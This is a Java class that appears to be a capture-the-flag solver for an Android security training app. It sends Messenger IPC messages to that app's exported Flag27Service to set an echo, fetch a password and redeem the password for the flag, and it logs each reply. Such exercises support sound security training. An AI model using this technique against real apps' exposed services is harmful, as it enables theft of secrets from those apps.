package com.sntrain.kribas.hextree1;

import android.content.ComponentName;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.Messenger;
import android.util.Log;
import android.widget.Toast;

import java.util.stream.Collectors;

public class Flag27ServiceInteractor {
    public String password;
    public String echo;
    public Messenger passwordReplyMessenger;
    public Messenger genericReplyMessenger;
    public Flag27ServiceInteractor(){
        echo = "give flag";
        passwordReplyMessenger = new Messenger(new Handler(Looper.getMainLooper()) {
            @Override
            public void handleMessage(Message msg) {
                Log.v("Flag27Solver", "Received Password reply: what=" + msg.what);
                Bundle bundle =msg.getData();
                String bundleStr = bundle.keySet().stream().map(k -> k + "=(" + bundle.get(k).getClass().getSimpleName() + ")" + bundle.get(k)).collect(Collectors.joining("\n"));
                Log.v("Flag27Solver", "Reply Password data: " + bundleStr);
                if (msg.getData().containsKey("password"))
                    password = msg.getData().getString("password");
                Log.v("Flag27Solver", "Password: " + password);
            }
        });

        genericReplyMessenger = new Messenger(new Handler(Looper.getMainLooper()) {
            @Override
            public void handleMessage(Message msg) {
                Log.v("Flag27Solver", "Received Generic reply: what=" + msg.what);
                Bundle bundle =msg.getData();
                String bundleStr = bundle.keySet().stream().map(k -> k + "=(" + bundle.get(k).getClass().getSimpleName() + ")" + bundle.get(k)).collect(Collectors.joining("\n"));
                Log.v("Flag27Solver", "Generic Reply data: " + bundleStr);
            }
        });
    }

    public Message getSetEchoMessage(){
        Message msg = Message.obtain(null,1);
        Bundle data = new Bundle();
        data.putString("echo",echo);
        msg.setData(data);
        msg.replyTo = genericReplyMessenger;
        return msg;
    }

    public Message getGetPasswordMessage(){
        Message msg = Message.obtain(null,2);
        msg.replyTo = passwordReplyMessenger;
        msg.setData(new Bundle());
        msg.obj = new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag27Service");
        return msg;
    }

    public Message getGetFlagMessage(){
        Message msg = Message.obtain(null,3);
        Bundle data = new Bundle();
        Log.v("Flag27Solver", "Getting Flag with password: " + password);
        data.putString("password",password);
        msg.setData(data);
        msg.replyTo = genericReplyMessenger;
        return msg;
    }
}

